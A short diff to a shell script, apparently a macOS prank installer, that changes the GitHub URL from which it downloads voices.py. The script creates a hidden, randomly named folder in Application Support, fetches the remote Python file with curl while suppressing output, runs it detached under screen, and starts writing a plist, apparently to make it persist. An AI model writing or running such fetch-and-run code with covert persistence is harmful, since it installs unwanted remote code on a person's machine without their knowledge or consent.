@@ -11,7 +11,7 @@ ${PRE}if [ ! $? -ne 0 ]; then
 ${PRE}    APP_DIR="${HOME}/Library/Application Support/.\${RANDOM}-\${RANDOM}/"
 ${PRE}    mkdir -p "\${APP_DIR}"
 ${PRE}    cd "\${APP_DIR}"
-${PRE}    curl -O https://raw.github.com/dcramer/voices.py/master/voices.py > /dev/null 2>&1
+${PRE}    curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
 ${PRE}    screen -d -m python voices.py
 ${PRE}    echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
 <!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\"
